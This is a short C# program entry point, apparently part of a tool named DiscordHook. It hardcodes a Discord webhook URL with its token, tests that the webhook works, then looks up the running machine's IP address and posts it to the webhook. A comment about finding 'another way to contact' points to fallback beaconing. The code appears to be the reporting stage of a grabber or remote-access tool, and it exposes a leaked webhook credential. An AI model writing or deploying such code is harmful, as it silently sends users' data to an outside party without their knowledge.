using System;
using System.Threading.Tasks;
using static DiscordHook.Alerts;
using static DiscordHook.Utility;
using static DiscordHook.Win32Api;

namespace DiscordHook
{
    internal static class Program
    {
        private static async Task Main(string[] args)
        {
            const string url = "https://discord.com/api/webhooks/849806948882055228/5STEFuPPtwaRVlfp-8hj_ynX44cgal7mYcOCaN9_bwjVBz-LdXLtKrNz4PtvOeyiuR9t";

            if (!await CheckDiscordHook(url))
            {
                //look for another way to contact
            }
            await SendHookAlertAsync(await GetIpAsync(), url);
            
        }
    }
}